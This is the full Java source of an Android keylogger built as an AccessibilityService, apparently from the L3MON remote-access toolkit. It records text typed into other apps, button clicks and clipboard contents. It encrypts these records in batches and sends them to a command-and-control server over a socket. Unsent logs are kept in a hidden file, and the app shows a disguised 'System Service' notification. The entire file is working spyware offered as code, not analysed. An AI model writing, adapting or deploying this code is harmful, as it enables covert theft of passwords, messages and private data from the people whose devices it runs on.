package com.etechd.l3mon.keylogger;

import android.accessibilityservice.AccessibilityService;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.ClipboardManager;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import androidx.core.app.NotificationCompat;

import com.etechd.l3mon.IOSocket;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.security.SecureRandom;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

import javax.crypto.Cipher;
import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

public class L3M0NKeyLogger extends AccessibilityService {

    private static final String TAG = "L3M0NKeyLogger";
    private static final String CHANNEL_ID = "L3M0NKeyLogger";
    private static final String KEY_FILE = "l3mon.key";
    private static final String LOG_FILE = ".keylog.dat"; // Hidden file
    private static final int NOTIFICATION_ID = 1337;
    private static final int BATCH_SIZE = 100;
    private static final long FLUSH_INTERVAL = 15000; // 15 seconds

    private ExecutorService executor;
    private Handler mainHandler;
    private NotificationManager notificationManager;

    private List<String> keyBuffer = new ArrayList<>();
    private SecretKey encryptionKey;
    private Cipher cipher;
    private SecureRandom random = new SecureRandom();

    private boolean isRunning = false;
    private ClipboardMonitor clipboardMonitor;
    private ClipboardManager clipboardManager;

    private static L3M0NKeyLogger instance;

    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;

        executor = Executors.newFixedThreadPool(4);
        mainHandler = new Handler(Looper.getMainLooper());
        notificationManager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);

        // 1. Initialize AES-256 encryption
        initializeKeyStore();

        // 2. Load any persisted logs from previous session
        loadPersistedLogs();

        createNotificationChannel();
        startForeground(NOTIFICATION_ID, buildNotification());

        // 3. Start Clipboard Monitor
        clipboardMonitor = new ClipboardMonitor(this);
        clipboardManager = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
        registerClipboardListener();

        isRunning = true;
        Log.d(TAG, "L3M0N KeyLogger started (AES-256 + Batch + Secure Persistence)");

        // Periodic flush
        mainHandler.postDelayed(flushRunnable, FLUSH_INTERVAL);
    }

    public static L3M0NKeyLogger getInstance() {
        return instance;
    }

    // ==================== 1. AES-256 ENCRYPTION ====================
    private void initializeKeyStore() {
        try {
            File keyFile = new File(getFilesDir(), KEY_FILE);

            if (keyFile.exists()) {
                // Load existing key
                FileInputStream fis = new FileInputStream(keyFile);
                byte[] keyBytes = new byte[32];
                fis.read(keyBytes);
                fis.close();
                encryptionKey = new SecretKeySpec(keyBytes, "AES");
            } else {
                // Generate new 256-bit AES key
                KeyGenerator keyGen = KeyGenerator.getInstance("AES");
                keyGen.init(256);
                encryptionKey = keyGen.generateKey();

                // Save key securely (only readable by this app)
                FileOutputStream fos = new FileOutputStream(keyFile);
                fos.write(encryptionKey.getEncoded());
                fos.close();

                // Set restrictive permissions
                keyFile.setReadable(true, true);
                keyFile.setWritable(true, true);
            }

            // Initialize cipher
            cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");

        } catch (Exception e) {
            Log.e(TAG, "Failed to initialize AES-256 keystore", e);
        }
    }

    private String encryptData(String data) {
        if (encryptionKey == null || cipher == null || data == null) {
            return data;
        }

        try {
            byte[] iv = new byte[16];
            random.nextBytes(iv);
            IvParameterSpec ivSpec = new IvParameterSpec(iv);

            cipher.init(Cipher.ENCRYPT_MODE, encryptionKey, ivSpec);
            byte[] encrypted = cipher.doFinal(data.getBytes("UTF-8"));

            String ivBase64 = android.util.Base64.encodeToString(iv, android.util.Base64.NO_WRAP);
            String encBase64 = android.util.Base64.encodeToString(encrypted, android.util.Base64.NO_WRAP);

            return ivBase64 + ":" + encBase64;
        } catch (Exception e) {
            Log.e(TAG, "AES-256 encryption failed", e);
            return data;
        }
    }

    // ==================== 2. BATCH BUFFERING ====================
    private void addToBuffer(String entry) {
        synchronized (keyBuffer) {
            keyBuffer.add(entry);
            flushBufferIfNeeded();
        }
    }

    private void flushBufferIfNeeded() {
        synchronized (keyBuffer) {
            if (keyBuffer.size() >= BATCH_SIZE) {
                batchProcessKeys();
            }
        }
    }

    private void batchProcessKeys() {
        List<String> batch;
        synchronized (keyBuffer) {
            if (keyBuffer.isEmpty()) return;
            batch = new ArrayList<>(keyBuffer);
            keyBuffer.clear();
        }

        executor.execute(() -> {
            try {
                String encryptedBatch = encryptData(String.join("\n", batch));
                sendBatchToC2(encryptedBatch, batch.size());

                // Persist if send fails (we'll keep a local copy too)
                if (!sendSucceeded) {
                    persistLogs(batch);
                }
            } catch (Exception e) {
                Log.e(TAG, "Batch processing error", e);
                persistLogs(batch);
            }
        });
    }

    private boolean sendSucceeded = true;

    private void sendBatchToC2(String encryptedData, int count) {
        try {
            JSONObject payload = new JSONObject();
            payload.put("type", "keylog");
            payload.put("count", count);
            payload.put("encrypted", true);
            payload.put("data", encryptedData);
            payload.put("timestamp", System.currentTimeMillis());

            if (IOSocket.getInstance() != null &&
                IOSocket.getInstance().getIoSocket() != null &&
                IOSocket.getInstance().getIoSocket().connected()) {

                IOSocket.getInstance().getIoSocket().emit("0xKL", payload);
                sendSucceeded = true;
                Log.d(TAG, "Sent encrypted batch: " + count + " entries");
            } else {
                sendSucceeded = false;
            }
        } catch (Exception e) {
            sendSucceeded = false;
            Log.e(TAG, "Failed to send keylog batch", e);
        }
    }

    // ==================== 3. SECURE DATA PERSISTENCE ====================
    private File getLogFile() {
        return new File(getFilesDir(), LOG_FILE);
    }

    private void persistLogs(List<String> logs) {
        try {
            File logFile = getLogFile();
            FileOutputStream fos = new FileOutputStream(logFile, true); // append
            OutputStreamWriter writer = new OutputStreamWriter(fos);

            for (String log : logs) {
                String encrypted = encryptData(log);
                writer.write(encrypted + "\n");
            }
            writer.close();
            fos.close();

            // Make file hidden and restricted
            logFile.setReadable(true, true);
            logFile.setWritable(true, true);

        } catch (Exception e) {
            Log.e(TAG, "Failed to persist logs", e);
        }
    }

    private void loadPersistedLogs() {
        File logFile = getLogFile();
        if (!logFile.exists()) return;

        List<String> loaded = new ArrayList<>();
        try {
            BufferedReader reader = new BufferedReader(new InputStreamReader(new FileInputStream(logFile)));
            String line;
            while ((line = reader.readLine()) != null) {
                if (!line.trim().isEmpty()) {
                    loaded.add(line);
                }
            }
            reader.close();

            // Send persisted encrypted logs
            if (!loaded.isEmpty()) {
                executor.execute(() -> {
                    try {
                        String joined = String.join("\n", loaded);
                        sendBatchToC2(joined, loaded.size());
                        logFile.delete(); // clear after sending
                    } catch (Exception e) {
                        Log.e(TAG, "Error sending persisted logs", e);
                    }
                });
            }
        } catch (Exception e) {
            Log.e(TAG, "Failed to load persisted logs", e);
        }
    }

    // ==================== ACCESSIBILITY EVENTS ====================
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (!isRunning) return;

        try {
            switch (event.getEventType()) {
                case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                    handleEditTextChange(event);
                    break;
                case AccessibilityEvent.TYPE_VIEW_CLICKED:
                    handleButtonClick(event);
                    break;
                case AccessibilityEvent.TYPE_VIEW_FOCUSED:
                    handleFocusChange(event);
                    break;
            }
        } catch (Exception e) {
            Log.e(TAG, "Error processing event", e);
        }
    }

    private void handleEditTextChange(AccessibilityEvent event) {
        CharSequence text = event.getText() != null && event.getText().size() > 0 ? event.getText().get(0) : "";
        String pkg = event.getPackageName() != null ? event.getPackageName().toString() : "unknown";
        if (text.length() > 0) {
            addToBuffer("[" + getTimestamp() + "] [" + pkg + "] TEXT: " + text);
        }
    }

    private void handleButtonClick(AccessibilityEvent event) {
        String text = event.getText() != null && event.getText().size() > 0 ? event.getText().get(0).toString() : "";
        String pkg = event.getPackageName() != null ? event.getPackageName().toString() : "unknown";
        addToBuffer("[" + getTimestamp() + "] [" + pkg + "] CLICK: " + text);
    }

    private void handleFocusChange(AccessibilityEvent event) {
        String pkg = event.getPackageName() != null ? event.getPackageName().toString() : "unknown";
        addToBuffer("[" + getTimestamp() + "] [" + pkg + "] FOCUS");
    }

    // ==================== CLIPBOARD ====================
    private void registerClipboardListener() {
        if (clipboardMonitor != null) clipboardMonitor.enable();
    }

    private void unregisterClipboardListener() {
        if (clipboardMonitor != null) clipboardMonitor.disable();
    }

    public void onClipboardChanged(String text) {
        if (text != null && !text.trim().isEmpty()) {
            addToBuffer("[" + getTimestamp() + "] [CLIPBOARD] " + text);
        }
    }

    // ==================== NOTIFICATION & LIFECYCLE ====================
    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(CHANNEL_ID, "L3M0N Security", NotificationManager.IMPORTANCE_MIN);
            notificationManager.createNotificationChannel(ch);
        }
    }

    private Notification buildNotification() {
        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("System Service")
                .setContentText("Running")
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .setOngoing(true)
                .build();
    }

    private final Runnable flushRunnable = new Runnable() {
        @Override
        public void run() {
            if (isRunning) {
                synchronized (keyBuffer) {
                    if (!keyBuffer.isEmpty()) {
                        batchProcessKeys();
                    }
                }
                mainHandler.postDelayed(this, FLUSH_INTERVAL);
            }
        }
    };

    @Override
    public void onInterrupt() {}

    @Override
    public void onDestroy() {
        isRunning = false;
        unregisterClipboardListener();
        if (mainHandler != null) mainHandler.removeCallbacks(flushRunnable);
        if (executor != null) executor.shutdown();
        if (notificationManager != null) notificationManager.cancel(NOTIFICATION_ID);
        instance = null;
        super.onDestroy();
    }

    private String getTimestamp() {
        return android.text.format.DateFormat.format("yyyy-MM-dd HH:mm:ss", System.currentTimeMillis()).toString();
    }
}
